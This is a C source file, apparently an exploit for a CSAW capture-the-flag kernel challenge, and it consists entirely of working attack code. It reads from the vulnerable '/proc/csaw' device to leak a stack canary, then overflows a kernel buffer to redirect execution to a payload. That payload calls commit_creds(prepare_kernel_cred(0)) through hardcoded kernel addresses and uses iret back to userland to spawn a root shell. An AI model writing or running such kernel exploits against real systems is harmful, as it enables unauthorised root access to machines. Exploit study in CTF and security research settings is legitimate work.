#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame
{
	void *eip;
	uint32_t cs;
	uint32_t eflags;
	void *esp;
	uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

void launch_shell(void)
{
	system("/bin/sh");
}

void prepare_tf(void)
{
    asm("pushl %cs; popl tf + 4;" 
        "pushfl; popl tf + 8;"  
        "pushl %esp; popl tf + 12;"
        "pushl %ss; popl tf + 16;");
    tf.eip = launch_shell;
    tf.esp -= 1024; //unused part of stack
}

#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void*) KERNCALL = (void *)0xc016b950;
void (*commit_creds)(void *) KERNCALL = (void *)0xc016b610;

void payload(void)
{  
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
       "iret;");  
}

int main()
{
	int i;
	char buf[64];
	char payld[84];
	memset(payld, 0, 84);
	memset(buf, 0, 64);
	int fd = open("/proc/csaw", O_RDWR);
	if( fd < 0)
	{
		perror("open failed");
		exit(0);
	}
	lseek(fd, 24, SEEK_SET);
	read(fd, buf, 64);
	char canary[4] = {buf[16], buf[17], buf[18], buf[19]};
	memset(payld, 'a', 64);
	memcpy(payld + 64, canary, 4);
	memset(payld + 68, 'b', 12);
	*((void **)(payld + 80)) = &payload;
	prepare_tf();
	printf("getting root privilege......\n");
	write(fd, payld, 84);
	printf("got root privilege!\n");
	return 0;
}

